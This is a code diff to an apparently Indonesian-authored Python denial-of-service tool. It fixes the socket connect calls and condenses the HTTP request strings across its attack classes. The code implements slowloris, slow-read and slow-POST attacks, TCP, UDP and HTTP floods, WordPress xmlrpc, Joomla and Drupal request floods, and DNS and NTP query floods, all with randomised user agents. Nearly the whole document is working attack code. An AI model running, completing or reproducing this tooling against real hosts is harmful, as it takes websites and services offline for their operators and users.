@@ -117,32 +117,22 @@ MODES = {
 }
 
 # ========== ATTACK CLASSES ==========
+
 class RTAAttacks:
     @staticmethod
     def slowloris(target, port, use_ssl=False):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
-
             if use_ssl:
                 context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
-            headers = (
-                f"GET / HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Accept: */*\r\n"
-                f"Accept-Language: en-US,en;q=0.9\r\n"
-                f"Connection: keep-alive\r\n"
-                f"Keep-Alive: timeout=30, max=100\r\n\r\n"
-            )
-
-            s.send(headers.encode('utf-8'))
+            s.connect((target, port))
+            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nAccept: */*\r\n".encode())
             return s
-        except Exception:
+        except:
             return None
 
     @staticmethod
@@ -150,27 +140,16 @@ class RTAAttacks:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
-
             if use_ssl:
                 context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
+            s.connect((target, port))
             files = ['/index.html', '/style.css', '/script.js', '/file_besar.dat']
-            path = random.choice(files)
-
-            headers = (
-                f"GET {path} HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Accept: */*\r\n"
-                f"Connection: keep-alive\r\n\r\n"
-            )
-
-            s.send(headers.encode('utf-8'))
+            s.send(f"GET {random.choice(files)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode())
             return s
-        except Exception:
+        except:
             return None
 
     @staticmethod
@@ -178,27 +157,17 @@ class RTAAttacks:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
-
             if use_ssl:
                 context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
+            s.connect((target, port))
             content_length = random.randint(100000, 500000)
-            headers = (
-                f"POST / HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Content-Length: {content_length}\r\n"
-                f"Content-Type: application/x-www-form-urlencoded\r\n"
-                f"Connection: keep-alive\r\n\r\n"
-            )
-
-            s.send(headers.encode('utf-8'))
+            s.send(f"POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Length: {content_length}\r\n\r\n".encode())
             s.send(b"data=")
             return s
-        except Exception:
+        except:
             return None
 
     @staticmethod
@@ -206,43 +175,32 @@ class RTAAttacks:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(5)
-
             if use_ssl:
                 context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
+            s.connect((target, port))
             names = ['bebek', 'ayam', 'kucing', 'ikan', 'burung', 'sapi']
             exts = ['.dat', '.jpg', '.png', '.zip', '.rar']
             fake_file = f"/{random.choice(names)}_{random.randint(1000,9999)}{random.choice(exts)}"
-
-            headers = (
-                f"GET {fake_file} HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Accept: */*\r\n"
-                f"Connection: close\r\n\r\n"
-            )
-
-            s.send(headers.encode('utf-8'))
+            s.send(f"GET {fake_file} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n".encode())
             return s
-        except Exception:
+        except:
             return None
 
     @staticmethod
     def maintain(s, mode):
         try:
             if mode == 'slowloris':
-                s.send(f"X-{random.randint(1000,9999)}: {random.randint(1,9999)}\r\n".encode('utf-8'))
+                s.send(f"X-{random.randint(1000,9999)}: {random.randint(1,9999)}\r\n".encode())
             elif mode in ['slowread', '404']:
                 s.recv(1)
             elif mode == 'slowpost':
                 s.send(b"x")
             return True
-        except Exception:
+        except:
             return False
-
 
 class YHCAttacks:
     @staticmethod
@@ -253,7 +211,7 @@ class YHCAttacks:
             s.connect((target, port))
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -263,9 +221,8 @@ class YHCAttacks:
             data = os.urandom(random.randint(64, 1024))
             s.sendto(data, (target, port))
             return 1
-        except Exception:
+        except:
             return 0
-
 
 class WebAttacks:
     @staticmethod
@@ -278,19 +235,13 @@ class WebAttacks:
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
+            s.connect((target, port))
             paths = ['/', '/index.html', '/about', '/contact', '/products']
-            request = (
-                f"GET {random.choice(paths)} HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Accept: */*\r\n"
-                f"Connection: close\r\n\r\n"
-            )
-            s.send(request.encode('utf-8'))
+            request = f"GET {random.choice(paths)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
+            s.send(request.encode())
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -311,20 +262,13 @@ class WebAttacks:
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
+            s.connect((target, port))
             data = f"data={random.randint(1000,9999)}&submit=1"
-            request = (
-                f"POST / HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Content-Type: application/x-www-form-urlencoded\r\n"
-                f"Content-Length: {len(data)}\r\n"
-                f"Connection: close\r\n\r\n{data}"
-            )
-            s.send(request.encode('utf-8'))
+            request = f"POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(data)}\r\n\r\n{data}"
+            s.send(request.encode())
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -337,19 +281,13 @@ class WebAttacks:
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
-            request = (
-                f"HEAD / HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Connection: close\r\n\r\n"
-            )
-            s.send(request.encode('utf-8'))
+            s.connect((target, port))
+            request = f"HEAD / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
+            s.send(request.encode())
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
-
 
 class CMSAttacks:
     @staticmethod
@@ -362,20 +300,13 @@ class CMSAttacks:
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
+            s.connect((target, port))
             xml = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
-            request = (
-                f"POST /xmlrpc.php HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Content-Type: text/xml\r\n"
-                f"Content-Length: {len(xml)}\r\n"
-                f"Connection: close\r\n\r\n{xml}"
-            )
-            s.send(request.encode('utf-8'))
+            request = f"POST /xmlrpc.php HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nContent-Type: text/xml\r\nContent-Length: {len(xml)}\r\n\r\n{xml}"
+            s.send(request.encode())
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -388,18 +319,13 @@ class CMSAttacks:
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
+            s.connect((target, port))
             options = ['com_users', 'com_content', 'com_admin', 'com_cache']
-            request = (
-                f"GET /index.php?option={random.choice(options)} HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Connection: close\r\n\r\n"
-            )
-            s.send(request.encode('utf-8'))
+            request = f"GET /index.php?option={random.choice(options)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
+            s.send(request.encode())
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -412,18 +338,13 @@ class CMSAttacks:
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
+            s.connect((target, port))
             nodes = [f"node/{random.randint(1,1000)}", f"user/{random.randint(1,100)}"]
-            request = (
-                f"GET /{random.choice(nodes)} HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Connection: close\r\n\r\n"
-            )
-            s.send(request.encode('utf-8'))
+            request = f"GET /{random.choice(nodes)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
+            s.send(request.encode())
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -436,20 +357,14 @@ class CMSAttacks:
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=target)
-
+            s.connect((target, port))
             php_files = ['index.php', 'config.php', 'wp-config.php', 'login.php', 'admin.php']
-            request = (
-                f"GET /{random.choice(php_files)} HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
-                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                f"Connection: close\r\n\r\n"
-            )
-            s.send(request.encode('utf-8'))
+            request = f"GET /{random.choice(php_files)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\r\n\r\n"
+            s.send(request.encode())
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
-
 
 class AppLayerAttacks:
     @staticmethod
@@ -471,7 +386,7 @@ class AppLayerAttacks:
             query = transaction_id + flags + questions + b'\x00\x00' + b'\x00\x00' + b'\x00\x00' + qname + qtype + qclass
             s.sendto(query, (target, port))
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -482,7 +397,7 @@ class AppLayerAttacks:
             payload = b'\x1b' + 47 * b'\0'
             s.sendto(payload, (target, port))
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -505,7 +420,7 @@ class AppLayerAttacks:
                     break
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -527,7 +442,7 @@ class AppLayerAttacks:
                     break
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -544,7 +459,7 @@ class AppLayerAttacks:
                 pass
             s.close()
             return 1
-        except Exception:
+        except:
             return 0
 
     @staticmethod
@@ -559,8 +474,8 @@ class AppLayerAttacks:
             except:
                 pass
             s.close()
-                        return 1
-        except Exception:
+            return 1
+        except:
             return 0
 
 # ========== ATTACK THREAD ==========
